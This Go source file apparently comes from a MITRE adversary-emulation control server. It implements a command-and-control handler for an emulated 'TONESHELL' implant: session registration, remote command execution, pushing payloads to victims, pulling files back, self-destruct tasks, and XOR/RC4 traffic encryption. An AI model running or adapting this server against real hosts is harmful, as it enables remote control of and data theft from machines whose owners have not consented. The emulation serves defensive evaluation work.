package toneshell

import (
    "crypto/md5"
    "crypto/rc4"
    "encoding/binary"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "net"
    "os"
    "path/filepath"
    "strconv"
    "strings"
    "sync"

    "evals.mitre.org/control_server/config"
    "evals.mitre.org/control_server/handlers/base_handler"
    "evals.mitre.org/control_server/handlers/handler_manager"
    "evals.mitre.org/control_server/handlers/handler_util"
    "evals.mitre.org/control_server/util"
)

const (
    HANDLER_NAME    = "toneshell"
    MAGIC_BYTES_STR = "180404"

    MAGIC_BYTES_SIZE         = 3
    ENC_KEY_SIZE             = 256
    UUID_SIZE                = 16
    PACKET_DATA_SIZE         = 2
    PACKET_TYPE_SIZE         = 1
    HANDSHAKE_RESP_DATA_SIZE = 2
    TASK_CMD_FIELDS_SIZE     = 4
    FILE_CHUNK_REQUEST_SIZE  = TASK_CMD_FIELDS_SIZE * 3
    DWORD_SIZE               = 4

    MAX_TASK_CMD_STR            = 1024 //bytes
    MAX_FILE_CHUNK              = 4096 //bytes
    DEFAULT_TASK_TIMEOUT uint32 = 120  //seconds

    C2_ENCRYPTION_NONE = 0
    C2_ENCRYPTION_XOR  = 1
    C2_ENCRYPTION_RC4  = 2
)

var (
    MAGIC_BYTES = []byte{0x18, 0x04, 0x04}

    // File upload / download default paths
    DEFAULT_PAYLOAD_DIR = filepath.Join(filepath.Dir(util.ProjectRoot), "payloads")

    // Implant packet types
    HANDSHAKE_REQ      = byte(1)
    BEACON             = byte(2)
    TASK_ERROR         = byte(3)
    FILE_CHUNK_REQUEST = byte(13)
    TASK_COMPLETE      = byte(14)
    TASK_OUTPUT        = byte(15)

    // Implant response types
    RESP_FILE_DOWNLOAD = uint32(3)
    RESP_EXEC_CMD      = uint32(5)
    RESP_FILE_UPLOAD   = uint32(7)

    // Server packet types
    FILE_DOWNLOAD  = byte(3)
    IDLE           = byte(4)
    EXEC           = byte(5)
    FILE_CHUNK     = byte(6)
    FILE_UPLOAD    = byte(7)
    HANDSHAKE_RESP = byte(8)
    OUTPUT_ACK     = byte(9)
    RECONNECT_REQ  = byte(10)
    TERMINATE      = byte(255)

    // Task output / command tracking
    TASK_OUTPUT_MAP = make(map[string]map[uint32][]byte)
    FILE_TASK_MAP   = make(map[string]map[uint32]string)

    // Maps implant UUIDs to session IDs
    UUID_SESSION_ID_MAP = make(map[string]string)

    // File handles
    PENDING_FILE_HANDLE_MAP = make(map[string]*os.File)
)

// Represents the implant packet sent to the C2
type ImplantPacket struct {
    UUID          string `json:",omitempty"`
    Key           []byte `json:",omitempty"`
    PacketType    byte   `json:",omitempty"`
    PacketSize    int64  `json:",omitempty"`
    PacketContent []byte `json:",omitempty"`
}

// Represents the server response / task to the implant
type ServerPacket struct {
    PacketSize    uint16
    PacketType    byte
    PacketContent []byte
}

// Represents the task command data (task number, timeout, length of command string, and command string)
type TaskCommandData struct {
    taskNumber []byte
    timeout    []byte
    lenTaskCmd []byte
    cmdStr     []byte
}

type ToneshellHandler struct {
    baseHandler        *base_handler.BaseHandlerUtil
    wrappedFuncHandles *WrappedFuncHandles
    globalMapMutex     sync.Mutex
    fileAccessMutex    sync.Mutex

    // to be initialized after init()
    listener   net.Listener
    payloadDir string
    encType    int
}

type WrappedFuncHandles struct {
    randStringGetter handler_util.RandAlphanumericStringGetter
}

func ToneshellHandlerFactory(funcHandles *WrappedFuncHandles) *ToneshellHandler {
    baseHandler := base_handler.BaseHandlerFactory(HANDLER_NAME)

    return &ToneshellHandler{
        baseHandler:        baseHandler,
        wrappedFuncHandles: funcHandles,
    }
}

func init() {
    // use production function wrappers
    wrappedFuncHandles := &WrappedFuncHandles{
        randStringGetter: handler_util.GetRandomAlphanumericString,
    }
    handler_manager.RegisterAvailableHandler(ToneshellHandlerFactory(wrappedFuncHandles))
}

func (o *ToneshellHandler) GetName() string {
    return HANDLER_NAME
}

// StartHandler starts the C2 Handler
func (o *ToneshellHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    // set the bind and REST API addresses for the base handler
    err := o.baseHandler.SetBindAddr(configEntry)
    if err != nil {
        return err
    }
    o.baseHandler.SetRestApiAddr(restAddress)
    o.baseHandler.HandlerLogInfo("Starting %s Handler to listen on %s", o.baseHandler.Name, o.baseHandler.BindAddr)

    // Get encryption settings for the handler
    encType := C2_ENCRYPTION_NONE // default to none
    encInt, ok := configEntry["encryption_type"]
    if ok {
        encString, ok := encInt.(string)
        if !ok {
            return errors.New("encryption type configuration value must be a string")
        }

        if len(encString) == 0 {
            return errors.New("please provide a non-empty encryption type")
        }

        encStringLower := strings.ToLower(encString)
        if encStringLower == "rc4" {
            encType = C2_ENCRYPTION_RC4
        } else if encStringLower == "xor" {
            encType = C2_ENCRYPTION_XOR
        } else {
            return errors.New("unsupported encryption type")
        }
    }
    o.encType = encType

    // Get the payload directory for file download
    o.payloadDir, err = config.GetHandlerPayloadDir(configEntry)
    if err != nil {
        o.payloadDir = DEFAULT_PAYLOAD_DIR
    }

    // Start the TCP listener
    o.listener, err = net.Listen("tcp", o.baseHandler.BindAddr)
    if err != nil {
        return err
    }
    go o.startListener()

    return nil
}

// StopHandler stops the C2 Handler
func (o *ToneshellHandler) StopHandler() error {
    o.baseHandler.HandlerLogInfo("Stopping %s Handler", o.baseHandler.Name)
    if err := o.listener.Close(); err != nil {
        return err
    }
    return nil
}

// TONESHELL TCP Listener
func (o *ToneshellHandler) startListener() {
    // Listen for incoming connections.
    defer o.listener.Close()

    for {
        // Listen for an incoming connection
        conn, err := o.listener.Accept()
        if err != nil {
            if !errors.Is(err, net.ErrClosed) {
                o.baseHandler.HandlerLogError("unable to accept connections: %s", err.Error())
            }
            return
        }

        // Handle connections in a new goroutine
        go func(conn net.Conn) {
            defer conn.Close()
            packet := []byte{}
            buf := make([]byte, 32*1024)
            for {
                len, err := conn.Read(buf)
                if err != nil {
                    if err != io.EOF {
                        o.baseHandler.HandlerLogError("Error reading: %s", err.Error())
                        return
                    }
                    break
                }
                packet = append(packet, buf[:len]...)
            }

            // Parse the implant packet
            implantPacket, err := o.ParseImplantPacket(packet)
            if err != nil {
                o.baseHandler.HandlerLogError("Failed to parse implant data: %s", err.Error())
                return
            }

            var resp []byte
            if implantPacket.PacketType == HANDSHAKE_REQ {
                resp, err = o.HandleHandshake(*implantPacket)
                if err != nil {
                    o.baseHandler.HandlerLogError("Failed to handle handshake for implant with UUID %s: %s", implantPacket.UUID, err.Error())
                    resp, _ = o.ConvertTaskToResponse("", BEACON, "", implantPacket.Key)
                }
                conn.Write(resp)
            } else {
                sessionId, err := implantUuidToSessionId(implantPacket.UUID)
                if err != nil {
                    o.baseHandler.HandlerLogError("No session ID found for implant UUID %s. Requesting reconnect handshake.", implantPacket.UUID)
                    resp, _ = o.ConvertTaskToResponse("", RECONNECT_REQ, "", implantPacket.Key)
                    conn.Write(resp)
                } else if implantPacket.PacketType == BEACON {
                    resp, err = o.HandleGetTask(*implantPacket, sessionId)
                    if err != nil {
                        o.baseHandler.HandlerLogError("Failed to handle get task for implant session ID %s: %s", sessionId, err.Error())
                        resp, _ = o.ConvertTaskToResponse(sessionId, BEACON, "", implantPacket.Key)
                    }
                    conn.Write(resp)
                } else if implantPacket.PacketType == FILE_CHUNK_REQUEST {
                    resp, err = o.HandleFileDownload(*implantPacket, sessionId)
                    if err != nil {
                        o.baseHandler.HandlerLogError("Failed to handle file download request for implant session ID %s: %s", sessionId, err.Error())
                        resp, _ = o.ConvertTaskToResponse(sessionId, BEACON, "", implantPacket.Key)
                    }
                    conn.Write(resp)
                } else {
                    err = o.HandleGetResponse(*implantPacket, sessionId)
                    if err != nil {
                        o.baseHandler.HandlerLogError("Failed to handle task response for implant session ID %s: %s", sessionId, err.Error())
                    }

                    // Send task output acknowledgement if necessary
                    if implantPacket.PacketType == TASK_OUTPUT {
                        resp, _ = o.ConvertTaskToResponse(sessionId, TASK_OUTPUT, "", implantPacket.Key)
                        conn.Write(resp)
                    }
                }
            }

        }(conn)
    }
}

func implantUuidToSessionId(implantUuid string) (string, error) {
    if sessionId, ok := UUID_SESSION_ID_MAP[implantUuid]; ok {
        return sessionId, nil
    } else {
        return "", errors.New(fmt.Sprintf("No session ID for implant UUID: %s", implantUuid))
    }
}

func hostnameToSessionId(hostname string) string {
    hostnameHash := md5.Sum([]byte(hostname))
    return hex.EncodeToString(hostnameHash[:])
}

func (o *ToneshellHandler) HandleHandshake(resp ImplantPacket) ([]byte, error) {
    var err error
    taskStr := ""

    // Check if we have seen this implant before - if not, create a new session for it
    hostname := string(resp.PacketContent[DWORD_SIZE:])
    o.baseHandler.HandlerLogDebug("Generating session ID from hostname %s, length %d", hostname, len(hostname))
    sessionId := hostnameToSessionId(hostname)

    if !o.baseHandler.HasImplantSession(sessionId) {
        o.baseHandler.HandlerLogInfo("Received first-time handshake from implant UUID %s. Creating session with ID %s.", resp.UUID, sessionId)
        sessionData := map[string]string{"guid": sessionId, "handler": HANDLER_NAME, "hostName": hostname}
        err = o.baseHandler.RegisterNewImplant(sessionId, sessionData)
        if err != nil {
            o.baseHandler.HandlerLogError("Failed to register implant session for implant with session ID %s: %s", sessionId, err.Error())
            return nil, err
        }

        o.globalMapMutex.Lock() // critical section
        TASK_OUTPUT_MAP[sessionId] = make(map[uint32][]byte)
        FILE_TASK_MAP[sessionId] = make(map[uint32]string)
        UUID_SESSION_ID_MAP[resp.UUID] = sessionId
        o.globalMapMutex.Unlock() // end critical section
    } else {
        o.baseHandler.HandlerLogDebug("Received resumed handshake from implant UUID %s with session ID %s", resp.UUID, sessionId)
    }

    // Format the response
    handshakeResp, err := o.ConvertTaskToResponse(sessionId, resp.PacketType, taskStr, resp.Key)
    if err != nil {
        o.baseHandler.HandlerLogError("Failed to generate handshake response for implant with session ID %s: %s", sessionId, err.Error())
        return nil, err
    }

    return handshakeResp, nil
}

func (o *ToneshellHandler) ClosePendingFileHandle(filePath string) {
    closedHandle := false

    o.fileAccessMutex.Lock() // critical section
    if handle, ok := PENDING_FILE_HANDLE_MAP[filePath]; ok {
        handle.Close()
        delete(PENDING_FILE_HANDLE_MAP, filePath)
        closedHandle = true
    }
    o.fileAccessMutex.Unlock() // end critical section

    if closedHandle {
        o.baseHandler.HandlerLogDebug("Closed handle for file %s", filePath)
    } else {
        o.baseHandler.HandlerLogDebug("Could not find handle for file %s", filePath)
    }
}

func (o *ToneshellHandler) HandleGetTask(resp ImplantPacket, sessionId string) ([]byte, error) {
    o.baseHandler.HandlerLogDebug("Received task request from implant UUID %s (session ID %s)", resp.UUID, sessionId)
    taskStr, err := o.baseHandler.GetImplantTask(sessionId)
    if err != nil {
        o.baseHandler.HandlerLogError("Failed to get task for session ID %s: %s", sessionId, err.Error())
        return nil, err
    }

    // Format the task
    task, err := o.ConvertTaskToResponse(sessionId, resp.PacketType, taskStr, resp.Key)
    if err != nil {
        o.baseHandler.HandlerLogError("Failed to convert task to response for session ID %s: %s", sessionId, err.Error())
        return nil, err
    }

    return task, nil
}

func (o *ToneshellHandler) HandleGetResponse(resp ImplantPacket, sessionId string) error {
    var err error
    var output []byte

    // Check that the implant packet content is the correct minimum length
    if len(resp.PacketContent) < (TASK_CMD_FIELDS_SIZE + TASK_CMD_FIELDS_SIZE) {
        return errors.New("received task response with invalid length, dropping output")
    }

    // Set task number & packet type (if file upload output)
    packetType := resp.PacketType
    taskNumber := binary.LittleEndian.Uint32(resp.PacketContent[:TASK_CMD_FIELDS_SIZE])

    o.globalMapMutex.Lock() // critical section
    filePath, isFileTask := FILE_TASK_MAP[sessionId][taskNumber]
    o.globalMapMutex.Unlock() // end critical section

    if isFileTask && resp.PacketType == TASK_OUTPUT {
        packetType = FILE_UPLOAD
    }

    switch packetType {
    case FILE_UPLOAD:
        if err := o.HandleFileUpload(filePath, resp.PacketContent[DWORD_SIZE*2:]); err != nil {
            o.baseHandler.HandlerLogError("Unable to upload file chunk: %s", err.Error())
            return err
        }
        chunkSize := binary.LittleEndian.Uint32(resp.PacketContent[TASK_CMD_FIELDS_SIZE : TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE])
        o.baseHandler.HandlerLogInfo("Received file upload chunk from session ID %s; task number %d, file path: %s, file chunk size: %d", sessionId, taskNumber, filePath, chunkSize)
        return nil
    case TASK_ERROR:
        o.globalMapMutex.Lock() // critical section
        if _, ok := TASK_OUTPUT_MAP[sessionId][taskNumber]; ok {
            output = TASK_OUTPUT_MAP[sessionId][taskNumber]
        } else {
            output = []byte{}
        }
        o.globalMapMutex.Unlock() // end critical section

        // Check if we have an open file handle to close
        if isFileTask {
            o.ClosePendingFileHandle(filePath)
        }

        errCode := binary.LittleEndian.Uint32(resp.PacketContent[TASK_CMD_FIELDS_SIZE:])
        o.baseHandler.HandlerLogError("Received task error response from session ID %s, task number %d; error code: %v", sessionId, taskNumber, errCode)
    case TASK_OUTPUT:
        chunkSize := binary.LittleEndian.Uint32(resp.PacketContent[TASK_CMD_FIELDS_SIZE : TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE])
        o.baseHandler.HandlerLogInfo("Received task output chunk from session ID %s, task number %d; output chunk size: %d", sessionId, taskNumber, chunkSize)

        o.globalMapMutex.Lock() // critical section
        if _, ok := TASK_OUTPUT_MAP[sessionId][taskNumber]; ok {
            TASK_OUTPUT_MAP[sessionId][taskNumber] = append(TASK_OUTPUT_MAP[sessionId][taskNumber], resp.PacketContent[TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE:]...)
        } else {
            TASK_OUTPUT_MAP[sessionId][taskNumber] = resp.PacketContent[TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE:]
        }
        o.globalMapMutex.Unlock() // end critical section

        return nil
    case TASK_COMPLETE:
        o.globalMapMutex.Lock() // critical section
        if _, ok := TASK_OUTPUT_MAP[sessionId][taskNumber]; ok {
            output = TASK_OUTPUT_MAP[sessionId][taskNumber]
        } else {
            output = []byte{}
        }
        o.globalMapMutex.Unlock() // end critical section

        // Check if we have an open file handle to close
        if isFileTask {
            o.ClosePendingFileHandle(filePath)
        }

        taskType := binary.LittleEndian.Uint32(resp.PacketContent[TASK_CMD_FIELDS_SIZE : TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE])
        exitCode := binary.LittleEndian.Uint32(resp.PacketContent[TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE:])
        o.baseHandler.HandlerLogInfo("Received task complete response from session ID %s, task number %d; task type: %d, exit code: %d. Registering task output.", sessionId, taskNumber, taskType, exitCode)
        if taskType == RESP_EXEC_CMD {
            _, err = o.baseHandler.RegisterTaskOutput(sessionId, output)
            if err != nil {
                o.baseHandler.HandlerLogError("Failed to register response for implant session ID %s: %s", sessionId, err.Error())
                return err
            }
        } else if taskType == RESP_FILE_DOWNLOAD {
            o.baseHandler.HandlerLogSuccess("Successfully downloaded file %s", filePath)
        } else if taskType == RESP_FILE_UPLOAD {
            o.baseHandler.HandlerLogSuccess("Successfully uploaded file %s", filePath)
        }
    default:
        return errors.New("received task response with invalid packet type, dropping output")
    }

    return nil
}

func (o *ToneshellHandler) HandleFileUpload(filePath string, content []byte) error {
    o.fileAccessMutex.Lock() // critical section
    defer o.fileAccessMutex.Unlock()

    handle, ok := PENDING_FILE_HANDLE_MAP[filePath]
    var err error
    if !ok {
        handle, err = os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
            return errors.New(fmt.Sprintf("Failed to open dest file for upload: %s", err.Error()))
        }
        PENDING_FILE_HANDLE_MAP[filePath] = handle
    }

    if _, err := handle.Write(content); err != nil {
        return errors.New(fmt.Sprintf("Failed to write to dest file for upload: %s", err.Error()))
    }

    return nil
}

func (o *ToneshellHandler) HandleFileDownload(implantPacket ImplantPacket, sessionId string) ([]byte, error) {
    var resp []byte

    // Ensure packet content is valid, log request if so
    if len(implantPacket.PacketContent) != FILE_CHUNK_REQUEST_SIZE {
        return nil, errors.New("received file chunk request with invalid length, dropping packet")
    }
    o.baseHandler.HandlerLogDebug("Received file chunk request from session ID %s", sessionId)

    // Extract file request data
    taskNumber := binary.LittleEndian.Uint32(implantPacket.PacketContent[:TASK_CMD_FIELDS_SIZE])
    offset := binary.LittleEndian.Uint32(implantPacket.PacketContent[TASK_CMD_FIELDS_SIZE : TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE])
    maxChunkSize := binary.LittleEndian.Uint32(implantPacket.PacketContent[TASK_CMD_FIELDS_SIZE+TASK_CMD_FIELDS_SIZE:])

    // Grab file
    o.globalMapMutex.Lock() // critical section
    payloadName, ok := FILE_TASK_MAP[sessionId][taskNumber]
    o.globalMapMutex.Unlock() // end critical section

    if !ok {
        return nil, errors.New("no payload associated with provided task number or session ID")
    }

    // Store file handle if not already opened
    var err error = nil
    o.fileAccessMutex.Lock() // critical section
    handle, ok := PENDING_FILE_HANDLE_MAP[payloadName]
    if !ok {
        handle, err = os.Open(payloadName)
        if err == nil {
            PENDING_FILE_HANDLE_MAP[payloadName] = handle
        }
    }
    o.fileAccessMutex.Unlock() // end critical section

    // In case there was an issue opening the file
    if err != nil {
        return nil, err
    }

    // concurrent read OK
    payloadBytes := make([]byte, maxChunkSize)
    bytesRead, err := handle.ReadAt(payloadBytes, int64(offset))
    if err == io.EOF || (err == nil && bytesRead < int(maxChunkSize)) {
        payloadBytes = payloadBytes[:bytesRead]
    } else if err != nil {
        return nil, err
    }

    // Set magic bytes
    resp = append(resp, MAGIC_BYTES...)

    // Set packet size
    packetSize := make([]byte, PACKET_DATA_SIZE)
    binary.LittleEndian.PutUint16(packetSize, uint16(bytesRead+PACKET_TYPE_SIZE))
    resp = append(resp, packetSize...)

    // Set packet type and content
    resp = append(resp, FILE_CHUNK)
    resp = append(resp, payloadBytes...)
    o.baseHandler.HandlerLogInfo("Sent file chunk to session ID %s, task number %d: %d bytes", sessionId, taskNumber, bytesRead)

    // Encrypt after the size field
    err = o.XCrypt(resp[MAGIC_BYTES_SIZE+PACKET_DATA_SIZE:], implantPacket.Key)
    if err != nil {
        return nil, err
    }

    return resp, nil
}

func (o *ToneshellHandler) extractTaskParts(sessionId string, taskStr string, task *ServerPacket) error {
    trimmedTask := strings.TrimSpace(taskStr)
    var taskData map[string]interface{}
    err := json.Unmarshal([]byte(trimmedTask), &taskData)
    if err != nil {
        return err
    }

    // Extract the packet type
    if cmdIDVal, ok := taskData["id"]; ok {
        taskID, ok := cmdIDVal.(float64)
        if !ok {
            return errors.New("bad command ID")
        }
        task.PacketType = byte(taskID)
    } else {
        return errors.New("packet type not provided in task string")
    }

    // If self destruct task, return early
    if task.PacketType == TERMINATE {
        task.PacketSize = PACKET_TYPE_SIZE
        task.PacketContent = make([]byte, 0)
        return nil
    }

    // Extract and calculate task command data
    taskCmdData := TaskCommandData{
        taskNumber: make([]byte, TASK_CMD_FIELDS_SIZE),
        lenTaskCmd: make([]byte, TASK_CMD_FIELDS_SIZE),
    }

    //Extract task number
    taskNum, ok := taskData["taskNum"]
    if !ok {
        return errors.New("task number not provided in task string")
    }
    binary.LittleEndian.PutUint32(taskCmdData.taskNumber, uint32(taskNum.(float64)))
    task.PacketContent = append(task.PacketContent, taskCmdData.taskNumber...)

    //Extract timeout
    if task.PacketType == EXEC {
        taskCmdData.timeout = make([]byte, TASK_CMD_FIELDS_SIZE)
        if timeout, ok := taskData["timeout"]; ok {
            binary.LittleEndian.PutUint32(taskCmdData.timeout, uint32(timeout.(float64)))
        } else {
            binary.LittleEndian.PutUint32(taskCmdData.timeout, DEFAULT_TASK_TIMEOUT)
        }
        task.PacketContent = append(task.PacketContent, taskCmdData.timeout...)
    }

    // Extract command string and calculate length
    if cmdStr, ok := taskData["args"]; ok {
        taskCmdData.cmdStr = []byte(strings.TrimSpace(cmdStr.(string)))
        if len(taskCmdData.cmdStr) > MAX_TASK_CMD_STR {
            return errors.New("command string exceeds max length of 1024 bytes")
        }
        binary.LittleEndian.PutUint32(taskCmdData.lenTaskCmd, uint32(len(taskCmdData.cmdStr)))

        // Append to packet content
        task.PacketContent = append(task.PacketContent, taskCmdData.lenTaskCmd...)
        task.PacketContent = append(task.PacketContent, taskCmdData.cmdStr...)
    }
    task.PacketSize = uint16(len(task.PacketContent)) + PACKET_TYPE_SIZE

    // Extract payload name if file download task
    if payloadStr, ok := taskData["payload"]; ok {
        o.globalMapMutex.Lock() // critical section
        FILE_TASK_MAP[sessionId][uint32(taskNum.(float64))] = filepath.Join(o.payloadDir, payloadStr.(string))
        o.globalMapMutex.Unlock() // end critical section
    }

    // Generate random file name if file upload task
    if task.PacketType == FILE_UPLOAD {
        var fileName string
        if fn, ok := taskData["fileName"]; ok {
            fileName = fn.(string)
        } else {
            fileName = o.wrappedFuncHandles.randStringGetter(7)
        }

        o.globalMapMutex.Lock() // critical section
        FILE_TASK_MAP[sessionId][uint32(taskNum.(float64))] = filepath.Join(util.UploadDir, fileName)
        o.globalMapMutex.Unlock() // end critical section

        o.baseHandler.HandlerLogInfo("Received file upload task. Setting filename %s as the destination.", fileName)
    }

    return nil
}

func (o *ToneshellHandler) ConvertTaskToResponse(sessionId string, packetType byte, taskStr string, key []byte) ([]byte, error) {
    var task ServerPacket
    var resp []byte

    // Set magic bytes
    resp = append(resp, MAGIC_BYTES...)

    // Compile response
    if packetType == HANDSHAKE_REQ {
        task.PacketSize = HANDSHAKE_RESP_DATA_SIZE
        task.PacketType = HANDSHAKE_RESP
        task.PacketContent = []byte{HANDSHAKE_RESP}
    } else if packetType == RECONNECT_REQ {
        task.PacketSize = PACKET_TYPE_SIZE
        task.PacketType = RECONNECT_REQ
        task.PacketContent = make([]byte, 0)
    } else if packetType == TASK_OUTPUT {
        task.PacketSize = PACKET_TYPE_SIZE
        task.PacketType = OUTPUT_ACK
        task.PacketContent = make([]byte, 0)
    } else if taskStr == "" {
        task.PacketSize = PACKET_TYPE_SIZE
        task.PacketType = IDLE
        task.PacketContent = make([]byte, 0)
    } else {
        err := o.extractTaskParts(sessionId, taskStr, &task)
        if err != nil {
            return nil, err
        }
    }

    // Set packet size
    packetSize := make([]byte, PACKET_DATA_SIZE)
    binary.LittleEndian.PutUint16(packetSize, uint16(task.PacketSize))
    resp = append(resp, packetSize...)

    // Set packet type and content
    resp = append(resp, task.PacketType)
    resp = append(resp, task.PacketContent...)

    // Encrypt after the size field
    err := o.XCrypt(resp[MAGIC_BYTES_SIZE+PACKET_DATA_SIZE:], key)
    if err != nil {
        return nil, err
    }

    return resp, nil
}

func (o *ToneshellHandler) ParseImplantPacket(data []byte) (*ImplantPacket, error) {
    implantPacket := new(ImplantPacket)

    // Check for magic bytes, drop packet if they don't match
    data_magic_bytes := hex.EncodeToString(data[:MAGIC_BYTES_SIZE])
    if data_magic_bytes != MAGIC_BYTES_STR {
        return nil, errors.New("implant packet does not contain correct magic bytes, packet dropped")
    }

    // Extract packet data size
    dataSize := binary.LittleEndian.Uint16(data[MAGIC_BYTES_SIZE : MAGIC_BYTES_SIZE+PACKET_DATA_SIZE])
    implantPacket.PacketSize = int64(dataSize)

    // Extract encryption key
    keyStartIndex := MAGIC_BYTES_SIZE + PACKET_DATA_SIZE
    if len(data[keyStartIndex:]) < ENC_KEY_SIZE {
        return nil, errors.New("packet does not contain correct encryption key size")
    }
    implantPacket.Key = data[keyStartIndex : keyStartIndex+ENC_KEY_SIZE]

    // Check packet size
    if int64(len(data[keyStartIndex+ENC_KEY_SIZE:])) != implantPacket.PacketSize {
        return nil, errors.New("packet size is incorrect")
    }

    // Decrypt rest of packet and extract UUID
    uuidStartIndex := keyStartIndex + ENC_KEY_SIZE
    if len(data[uuidStartIndex:]) < UUID_SIZE {
        return nil, errors.New("packet does not contain UUID")
    }
    err := o.XCrypt(data[uuidStartIndex:], implantPacket.Key)
    if err != nil {
        return nil, errors.New(fmt.Sprintf("Failed to decrypt packet: %s", err.Error()))
    }

    implantPacket.UUID = hex.EncodeToString(data[uuidStartIndex : uuidStartIndex+UUID_SIZE])

    // Extract packet type and packet
    packetStartIndex := uuidStartIndex + UUID_SIZE
    hexPacketType, _ := strconv.Atoi(hex.EncodeToString((data[packetStartIndex : packetStartIndex+PACKET_TYPE_SIZE])))
    implantPacket.PacketType = byte(hexPacketType)
    implantPacket.PacketContent = data[packetStartIndex+PACKET_TYPE_SIZE:]

    return implantPacket, nil
}

// Encrypt or decrypt in place
func (o *ToneshellHandler) XCrypt(input []byte, key []byte) error {
    switch o.encType {
    case C2_ENCRYPTION_XOR:
        XORCrypt(input, key)
        return nil
    case C2_ENCRYPTION_RC4:
        return RC4Crypt(input, key)
    default:
        return nil
    }
}

func XORCrypt(input []byte, key []byte) {
    keyLen := len(key)
    for i := 0; i < len(input); i++ {
        input[i] ^= key[i%keyLen]
    }
}

func RC4Crypt(input []byte, key []byte) error {
    cipher, err := rc4.NewCipher(key)
    if err != nil {
        return err
    }
    cipher.XORKeyStream(input, input)
    return nil
}
